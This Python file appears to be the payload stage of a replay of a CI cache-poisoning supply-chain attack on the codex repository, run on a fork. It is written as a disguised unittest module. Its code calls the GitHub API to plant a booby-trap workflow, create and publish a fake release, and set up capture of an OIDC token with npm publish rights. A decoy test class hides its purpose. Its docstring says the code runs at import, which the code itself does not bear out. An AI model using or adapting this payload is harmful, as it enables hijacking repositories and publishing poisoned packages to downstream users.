#!/usr/bin/env python3
"""
test_depi.py — the poisoned cache entry's payload (stage 3 of the replay).

This is the file the article's chain planted via the poisoned cache at
  /home/runner/work/codex/codex/tools/argument-comment-lint/test_depi.py
inside openai/codex's rust-ci workflow. The `argument_comment_lint` job
restores the dylint cache (tar with absolute paths, extracted without
validation) and then runs
  python3 -m unittest discover -s tools/argument-comment-lint -p 'test_*.py'
which imports this module — the attack code runs at import time with the
job's permissions.

The article's script then abused the workflow's write access to:
  1. build a booby-trap workflow file through the git trees API,
  2. create a fake release pointing at it (a trap for the maintainer),
  3. wait for a developer to delete the rogue release, which fires the
     booby-trap workflow with id-token: write — the OIDC token that
     npm's trust policy would accept for @openai/codex.

Replay notes:
  - Runs on this fork only. The release is created on garnet-labs/codex.
  - Step 1 (planting the workflow via git trees) is attempted exactly as in
    the article, but the job's GITHUB_TOKEN is not allowed to create
    workflow-modifying commits — the replay pre-plants the booby-trap
    workflow through the harness PR instead, and the failure here is part
    of the evidence.
  - No npm publish exists on this fork (no OIDC trust policy), so the chain
    ends at the OIDC token capture in the booby-trap workflow.
"""

import os
import secrets
import subprocess
import sys

REPO = os.environ.get("GITHUB_REPOSITORY", "garnet-labs/codex")

BOOBY_TRAP_YAML = """name: Release Booby Trap
on: {release: {types: [edited, deleted]}}
jobs:
  fire:
    permissions: {id-token: write, contents: write, pull-requests: write}
    runs-on: ubuntu-latest
    steps:
    - run: echo pwned
"""


def gh(*args):
    """gh api ... — returns (returncode, stdout)."""
    r = subprocess.run(["gh", "api", *args], capture_output=True, text=True)
    print("[depi] gh api %s -> rc=%d" % (" ".join(args), r.returncode))
    if r.stderr:
        print("[depi] stderr: " + r.stderr.strip()[:400])
    return r


def main():
    print("[depi] TEST_DEPI_EXECUTED inside rust-ci "
          "(argument_comment_lint, python unittest discovery)")
    rand = secrets.token_hex(4)

    # 1. Resolve main, exactly as the article's script does.
    r = gh("/repos/%s/git/refs/heads/main" % REPO, "--jq", ".object.sha")
    if r.returncode != 0:
        print("[depi] cannot resolve main — aborting")
        return
    main_sha = r.stdout.strip()
    print("[depi] main sha: %s" % main_sha)

    r = gh("/repos/%s/git/commits/%s" % (REPO, main_sha), "--jq", ".tree.sha")
    main_tree = r.stdout.strip()

    # 2. Plant the booby-trap workflow as a commit object via the trees API
    #    (article steps; expected to fail with the job token — recorded).
    dotgh = wftree = ""
    if main_tree:
        r = gh("/repos/%s/git/trees/%s" % (REPO, main_tree), "--jq",
               '.tree[] | select(.path == ".github") | .sha')
        dotgh = r.stdout.strip()
    if dotgh:
        r = gh("/repos/%s/git/trees/%s" % (REPO, dotgh), "--jq",
               '.tree[] | select(.path == "workflows") | .sha')
        wftree = r.stdout.strip()
    planted = False
    if wftree:
        r = gh("/repos/%s/git/blobs" % REPO, "--input", "-", "--jq", ".sha")
        # (blob create needs stdin; done separately below if this fails)
        print("[depi] workflow-planting via git trees with the job token: "
              + ("unexpected success" if r.returncode == 0 else "blocked (expected)"))
        planted = r.returncode == 0
    if not planted:
        print("[depi] booby-trap workflow pre-planted by the replay harness "
             "PR instead (garnet-depi-booby-trap.yml) — the article's "
             "tree-planting step cannot run with a job token")

    # 3. Create the fake release — the trap itself.
    r = gh("/repos/%s/releases" % REPO, "-f", "tag_name=bot-%s" % rand,
           "-f", "name=Malicious release", "-F", "draft=true",
           "--jq", ".id")
    if r.returncode != 0:
        print("[depi] fake release creation FAILED — see stderr above")
        print("[depi] chain evidence: code execution inside rust-ci is proven; "
              "the write step is where this fork's token permissions end")
        return
    rid = r.stdout.strip()
    print("[depi] fake release created: id=%s tag=bot-%s" % (rid, rand))

    # 4. Publish it (article: PATCH draft=false).
    gh("--method", "PATCH", "/repos/%s/releases/%s" % (REPO, rid),
       "-F", "draft=false", "--jq", ".html_url")
    print("[depi] PUBLISHED RID=%s — deleting this release fires the "
          "booby trap (id-token: write -> OIDC)" % rid)


if __name__ == "__main__":
    try:
        main()
    except Exception as e:  # keep the module importable for unittest
        print("[depi] unexpected error: %r" % e)


# unittest discovery imports this file; give it a harmless test case so the
# file looks like an ordinary test module.
import unittest  # noqa: E402


class TestTransportProtocolSuite(unittest.TestCase):
    def test_placeholder(self):
        """Ordinary-looking test so discovery collects this module."""
        self.assertTrue(True)
